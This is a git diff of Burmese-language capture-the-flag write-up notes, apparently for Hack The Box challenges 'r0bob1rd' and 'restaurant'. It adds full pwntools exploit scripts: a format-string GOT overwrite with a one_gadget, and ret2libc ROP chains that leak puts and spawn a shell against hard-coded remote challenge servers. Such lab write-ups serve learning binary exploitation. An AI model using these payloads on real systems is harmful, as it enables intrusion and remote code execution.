@@ -15,7 +15,7 @@ Stripped:   No
 
 ```
 
-GOT overwrite လို့ရတယ်
+`Partial RELRO`ဆိုတော့ `GOT.plt` overwrite လို့ရတယ်
 PIE enable ဆိုတော့ ‌address leak လို့ကောင်းတာပေါ့
 ကိုယ်ပိုင် `glibc` နဲ့ run ခိုင်းတယ်
 အဆင်ပြေတယ် `glibc` version ရှာစရာမလိုတော့
@@ -138,7 +138,7 @@ void operation(void)
 ```
 
 	006020a1 ကနေ 8 byte ဆီ မြှောက်ပြီး ရွေ့ပြီးပြပေးတယ် ဆိုတော့ 8 byte မှာ 1x (1ဆ)ပေါ့
-ဆိုတော့ ငါတို့ ဒီကနေ GOT address တစ်ခုခုကို leak ပြီး` libc base `တွက်မယ်
+ဆိုတော့ ငါတို့ ဒီကနေ `got.pl`t address တစ်ခုခုကို leak ပြီး` libc base `တွက်မယ်
 NO PIE ဆို‌တော့ PLT address နဲ့ GOT entry address တွေက fixed ဖြစ်နေမှာဘဲ
 
 ```c
@@ -186,8 +186,63 @@ constraints:
 ```
 
 ပြီးရင် one gadget ရှာပြီး `libc  base` နဲ့ပေါင်းမယ်
+format string vuln ကိုသုံးပြီး `[0x602028] __stack_chk_fail@GLIBC_2.4 ` address ကို overwrite လုပ်မယ်
 
 
+```python
+from pwn import *
+
+
+context.log_level = 'info'
+context.binary = "./r0bob1rd"
+elf = context.binary
+
+def start():
+    if args.R:
+        return remote("154.57.164.82", 32310)
+    elif args.GDB:
+        return gdb.debug(elf.path, gdbscript='''
+            break main
+            b *0x0000000000400b4f
+            b *0x0000000000400b14
+            b *0x0000000000400b7c
+            b *0x0000000000400c08            
+            continue
+        ''')
+    else:
+        return process(elf.path)
+
+def libc_leak(p):
+    
+    p.recvuntil(b"lect a R0bob1rd > ")
+    p.sendline(b"-14")
+    p.recvuntil("'ve chosen: ")
+    print_f = p.recv(6).ljust(8, b"\x00")
+    print_f = u64(print_f)
+    print(f"Leaked printf: {hex(print_f)}")
+    libc = print_f - 0x0000000000061c90
+    print(f"Leaked libc: {hex(libc)}")
+    return libc
+
+def exploit(p, shell):
+    p.recvuntil(b"little description")
+    p.recvuntil(b"> ")
+    target = 0x602028
+    offset = 8
+    payload = fmtstr_payload(offset, {target: shell},write_size='short')
+    payload = payload.ljust(106, b'\x90')
+    p.sendline(payload)
+    p.interactive()
+
+
+
+if __name__ == '__main__':
+    io = start()
+    libc = libc_leak(io)
+    shell = libc + 0xe3b01
+    print("shell address: ", hex(shell))
+    exploit(io, shell)
+```
 
 
 
@@ -197,6 +252,7 @@ constraints:
 ----
 
 #### Execute
+
 
 ```c
 
@@ -686,3 +742,263 @@ pwndbg>
 buffer overflow လို့ရမယ်
 fixed address တွေဖြစ်တယ်
 
+ဘာ jump ရမယ် function မှမပါဘူး
+
+```c
+
+void fill(void)
+
+{
+  undefined8 local_28;
+  undefined8 local_20;
+  undefined8 local_18;
+  undefined8 local_10;
+  
+  local_28 = 0;
+  local_20 = 0;
+  local_18 = 0;
+  local_10 = 0;
+  color("\nYou can add these ingredients to your dish:","green",&DAT_00401144);
+  puts(&DAT_004011a5);
+  color("You can also order something else.\n> ","green",&DAT_00401144);
+  read(0,&local_28,0x400);
+  printf("\nEnjoy your %s",&local_28);
+  return;
+}
+
+```
+
+
+နောက်ပြီး  `libc` လည်းပေးထားတယ်ဆိုတော့  
+ငါတို့` ret2libc vuln` နဲ့ exploit လုပ်မယ်
+
+`libc` base တွက်ဖို့ရာ function တစ်ခုခုရဲ့ ` plt.got address `ကို သိမှရမယ်
+ဆိုတော့ puts နဲ့ ငါတို့ address ထုတ်ပြမယ်
+`argument` အနေနဲ့` puts@plt.got address` ကို ပေးလိုက်မယ်
+
+ရလာတဲ့ byte ကို ယူမယ်
+ငါတို ဒီမှာ `Address Isolation` လုပ်ဖို့လိုတယ်
+ဘာလို့ဆို ဒီမှာ ANSI Color Codes ကိုသုံးထားတယ်  (Terminal မှာ စာသားတွေ ပေါ်လာတဲ့အခါ အချို့စာသားတွေက အပြာရောင်၊ အဝါရောင်၊ သို့မဟုတ် အနီရောင် (Bold) စသဖြင့် လှလှပပ ပေါ်လာတာ)
+
+
+Program ဘက်ကနေ Screen ပေါ်ကို စာသားလှလှလေး ပြချင်ရင် ဥပမာ - `\x1b[1;36m🥡 Welcome...` ဆိုပြီး ပို့လိုက်တယ်
+- `\x1b[1;36m` ဆိုတာ "နောက်ကစာသားကို Cyan (အပြာနုရောင်) ပြောင်းပါ" လို့ Terminal ကို အမိန့်ပေးတဲ့ ကုဒ် ဖြစ်တယ်
+- Terminal က ဒီကုဒ်ကို မြင်ရင် စာအဖြစ် မပြတော့ဘဲ အရောင်ပဲ ပြောင်းပစ်လိုက်တယ်
+Python Script (`pwntools`) က `io.recvline()` နဲ့ data ကို ဖတ်တဲ့အခါ သူက လူလို မျက်စိနဲ့ ကြည့်တာမဟုတ်ဘဲ binary bytes အတိုင်း အကုန်သိမ်းတာ ဒါကြောင့် Terminal က ဖျောက်ထားတဲ့ `\x1b[1;36m` ဆိုတဲ့ byte တွေကိုပါ Python က အကုန်သိမ်းမိသွားတယ်
+
+
+ဆိုတော့ ငါတို့ ငါတို့ လိုချင်တဲ့ byte ကိုရှာယူမှဖြစ်မယ်
+```
+[ Binary က ပို့လိုက်တဲ့ Data ပုံစံ ]
+\x1b  [  1  ;  3  6  m  \x60  \x0e  \x68  \xe3  \xfb  \x7f  \n
+|____________________|  |______________________________|
+   ANSI Color Code                Memory Address အစစ်
+```
+
+
+
+Linux x64 System တွေမှာ User Space (ပရိုဂရမ်တွေ ပုံမှန် run တဲ့နေရာ) ရဲ့ Memory Address တွေဟာ အမြဲတမ်း **`0x7f`** နဲ့ စလေ့ရှိတယ်(ဥပမာ- `0x7ffbe3680e60`)
+Little-Endian စနစ်အရ memory ထဲမှာ သိမ်းတဲ့အခါ ပြောင်းပြန်သိမ်းလို့ `0x7f` က အနောက်ဆုံးမှာ ရောက်နေတတ်တယ်
+ Memory address ပုံစံ: `\x60\x0e\x68\xe3\xfb\x7f`
+စာသားတွေ ဘယ်လောက်ပဲ ရှုပ်နေပါစေ... `\x7f` ပါတဲ့ နေရာကို အရင်ရှာမယ်။ တွေ့ပြီဆိုရင် အဲဒီ `\x7f` နဲ့ သူ့အရှေ့က ၅ လုံး (စုစုပေါင်း ၆ လုံး) ကိုပဲ ကွက်တိ ဖြတ်ယူမယ်
+အဲဒီလို ဖြတ်ယူပြီးမှ `u64()` နဲ့ unpack လုပ်ပြီး `ljust(8, b'\x00')` နဲ့ byte ၈ လုံးပြည့်အောင် ဖြည့်လိုက်တဲ့အတွက် မင်းရဲ့ terminal မှာ `0x7ffbe3680e60` ဆိုတဲ့ လိပ်စာအစစ်
+
+
+
+```python
+from pwn import *
+
+
+context.log_level = 'debug'
+context.binary = "./restaurant"
+elf = context.binary
+
+def start():
+    if args.R:
+        return remote("154.57.164.82", 32310)
+    elif args.GDB:
+        return gdb.debug(elf.path, gdbscript='''
+            
+            b *0x0000000000400e9d         
+            continue
+        ''')
+    else:
+        return process(elf.path)
+
+
+
+def findputs(io):
+    payload = ...
+    payload = b'A' * 40
+    payload += p64(0x00000000004010a3)
+    payload += p64(elf.got['puts'])
+    payload += p64(elf.plt['puts'])
+    payload += p64(elf.symbols['main'])
+    io.recvuntil(b"> ")
+    io.sendline(b"1")
+    io.recvuntil(b"> ")
+    io.sendline(payload)
+    io.recvuntil(b"Enjoy your ")
+    io.recv(40)
+    raw_data = io.recvline()
+    
+    # ANSI Color escape codes တွေကို ဖယ်ထုတ်ပစ်တာ (ဥပမာ- \x1b[1;36m စတာတွေ)
+    # လိပ်စာအစစ်က 0x7f နဲ့ စမှာဖြစ်လို့ အဲဒီ byte ကနေစပြီး 6 bytes ကိုပဲ ဖြတ်ယူမယ်
+    if b'\x7f' in raw_data:
+        # \x7f ကနေ စပြီး နောက်ထပ် 6 bytes ကို ယူတယ်
+        idx = raw_data.index(b'\x7f')
+        # x64 address က များသောအားဖြင့် 6 bytes ရှိပြီး ကျန်တာ \x00 တွေဖြစ်တယ်
+        # ဒါကြောင့် \x7f ပါတဲ့နေရာကနေ နောက်ပြန် (သို့) ရှေ့တိုး ၆ လုံး ဖြတ်ယူမယ်
+        leaked_bytes = raw_data[idx-5 : idx+1] # \x7f က အနောက်ဆုံးမှာ ရှိတတ်လို့ပါ
+    else:
+        # အပေါ်က အဆင်မပြေရင် generic နည်းလမ်းနဲ့ strip လုပ်ပြီး ၆ လုံးပဲ ဖြတ်မယ်
+        # \x1b စတဲ့ non-printable တွေကို ဖယ်ဖို့ဖြစ်တယ်
+        leaked_bytes = raw_data.replace(b'\x1b[1;36m', b'').replace(b'\x1b[0m', b'').strip()[:6]
+
+    # 4. ရလာတဲ့ byte data ကို 8-byte ဖြစ်အောင် padding ပေးပြီး unpack လုပ်မယ်
+    puts_libc = u64(leaked_bytes.ljust(8, b'\x00'))
+    
+    print("\n" + "="*40)
+    print(f"[+] Leaked puts@libc address: {hex(puts_libc)}")
+    print("="*40 + "\n")
+    return puts_libc
+
+def getshell(io, system, binsh):
+    payload = b'A' * 40
+    payload += p64(0x000000000040063e)
+    payload += p64(0x00000000004010a3)
+    payload += p64(binsh)
+    payload += p64(system)
+    io.recvuntil(b"> ")
+    io.sendline(b"1")
+    io.recvuntil(b"> ")
+    io.sendline(payload)
+    io.clean()
+    io.interactive()
+
+
+if __name__ == '__main__':
+    io = start()
+    putslibc = findputs(io)
+    libc_base = putslibc - 0x0000000000080aa0
+    system = libc_base + 0x000000000004f550
+    binsh = libc_base + 0x1b3e1a
+    getshell(io, system, binsh)
+```
+
+
+နောက်ပြီး ဒီမှာ ငါတို့ local မှာရှိတဲ့ binary က သူ့ path ထဲမှာရှိတဲ့ libc နဲ့သွားချိတ်မသုံးဘူး
+
+အခြား binary
+```c
+                       
+┌──(Jackfruit㉿kali)-[~/…/binary/stack/htb/rObob1rd]
+└─$ ldd r0bob1rd 
+        linux-vdso.so.1 (0x00007fa1693ee000)
+        libc.so.6 => ./glibc/libc.so.6 (0x00007fa1691f6000)
+        ./glibc/ld.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007fa1693f0000)
+
+```
+
+လက်ရှိ binary 
+```c
+┌──(Jackfruit㉿kali)-[~/…/stack/htb/restaurant/pwn_restaurant]
+└─$ ldd restaurant 
+        linux-vdso.so.1 (0x00007f8d02dbb000)
+        libc.so.6 => /usr/lib/x86_64-linux-gnu/libc.so.6 (0x00007f8d02a00000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f8d02dbd000)
+
+```
+
+
+ဆိုတော့ ငါတို့ python scriptကို ပြန်ပြင်ရေးမယ်
+
+
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+context.binary = "./restaurant"
+elf = context.binary
+
+def start():
+    if args.R:
+        # Remote Server ဆိုရင် HTB ရဲ့ libc ကို သုံးမယ်
+        return remote("154.57.164.76", 30227), ELF("./libc.so.6")
+    elif args.GDB:
+        return gdb.debug(elf.path, gdbscript='''
+            b *0x0000000000400e9d         
+            continue
+        '''), elf.libc
+    else:
+        # Local Process ဆိုရင် မင်း Kali ရဲ့ native libc ကိုပဲ သုံးရမယ်
+        return process(elf.path), elf.libc
+
+def findputs(io):
+    # Stage 1: Leak puts address
+    payload = b'A' * 40
+    payload += p64(0x00000000004010a3) # pop rdi; ret
+    payload += p64(elf.got['puts'])
+    payload += p64(elf.plt['puts'])
+    payload += p64(elf.symbols['main'])
+    
+    io.recvuntil(b"> ")
+    io.sendline(b"1")
+    io.recvuntil(b"> ")
+    io.sendline(payload)
+    
+    io.recvuntil(b"Enjoy your ")
+    io.recv(40) # 'A' ၄၀ ကျော်မယ်
+    raw_data = io.recvline()
+    
+    if b'\x7f' in raw_data:
+        idx = raw_data.index(b'\x7f')
+        leaked_bytes = raw_data[idx-5 : idx+1]
+    else:
+        leaked_bytes = raw_data.strip()[:6]
+
+    puts_libc = u64(leaked_bytes.ljust(8, b'\x00'))
+    print("\n" + "="*40)
+    print(f"[+] Leaked puts@libc address: {hex(puts_libc)}")
+    print("="*40 + "\n")
+    return puts_libc
+
+def getshell(io, libc, putslibc):
+    # Base Address ကို တွက်ချက်ခြင်း (pwntools က အလိုအလျောက် မှန်အောင် တွက်ပေးလိမ့်မယ်)
+    libc.address = putslibc - libc.symbols['puts']
+    system = libc.symbols['system']
+    binsh = next(libc.search(b"/bin/sh"))
+
+    print(f"[+] Calculated Libc Base : {hex(libc.address)}")
+    print(f"[+] Real System Address   : {hex(system)}")
+    print(f"[+] Real /bin/sh Address  : {hex(binsh)}")
+
+    # Stage 2 Payload
+    RET_GADGET = 0x000000000040063e
+    POP_RDI = 0x00000000004010a3
+    
+    payload = b'A' * 40
+    payload += p64(RET_GADGET) # Stack alignment
+    payload += p64(POP_RDI)
+    payload += p64(binsh)
+    payload += p64(system)
+    
+    io.recvuntil(b"> ")
+    io.sendline(b"1")
+    io.recvuntil(b"> ")
+    io.sendline(payload)
+    
+    # printf က ပြန်အော်မယ့် စာသားတွေကို interactive မဝင်ခင် စုပြီး ဖတ်ထုတ်ပစ်လိုက်ခြင်း
+    io.recvuntil(b"Enjoy your ")
+    
+    print("[🚀] Launching Interactive Shell...")
+    io.interactive()
+
+if __name__ == '__main__':
+    io, libc = start()
+    putslibc = findputs(io)
+    getshell(io, libc, putslibc)
+```
+
+----
